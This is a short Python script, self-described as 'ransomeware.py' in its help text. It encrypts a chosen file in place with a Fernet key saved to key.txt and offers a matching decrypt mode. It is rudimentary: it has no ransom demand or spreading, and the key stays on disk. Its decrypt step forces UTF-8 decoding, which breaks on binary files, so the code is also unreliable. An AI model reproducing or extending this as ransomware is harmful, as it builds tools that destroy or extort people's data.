#! /bin/env python3

"""

author: clive

"""

from cryptography.fernet import *
import os
import subprocess
import sys
import base64




operation = sys.argv[1]
#fileName = sys.argv[2]


def Encrypt(file):
    subprocess.call(["clear"])
    key = Fernet.generate_key()
    with open("key.txt", 'wb') as Key:
        Key.write(key)

    with open(file, 'rb') as F:
        Data = F.read()
        with open('key.txt', "rb") as KEY:
            EncryptionKey = KEY.read()
            with open(file, 'wb') as EncData:
                newData = Fernet(EncryptionKey).encrypt(Data)
                EncData.write(newData)

def Decrypt(file, key):
    fileName = file

    with open(file, 'rb') as file:
        givenData = file.read()
    with open(key, 'rb') as keyFile:
        DecryptionKey = keyFile.read()
    v1 = Fernet(DecryptionKey).decrypt(givenData)
    v2 = v1.decode("utf-8")
    with open(fileName, 'w') as newfile:
        newfile.write(v2)



if operation == "-h":
    print("""
    OPTIONS:
    -e: to encrypt files
    -d: to decrypt file
    EXAMPLE:
    python ransomeware.py -e [file to Encrypt]
    python ransomeware.py -d [file to Decrypt] --key [file containing the key]
          """)

elif operation.lower() == "-e":
    Encrypt(sys.argv[2])
elif operation == '-d':
    Decrypt(sys.argv[2], sys.argv[4])
else:
    print('Invalid syntax')

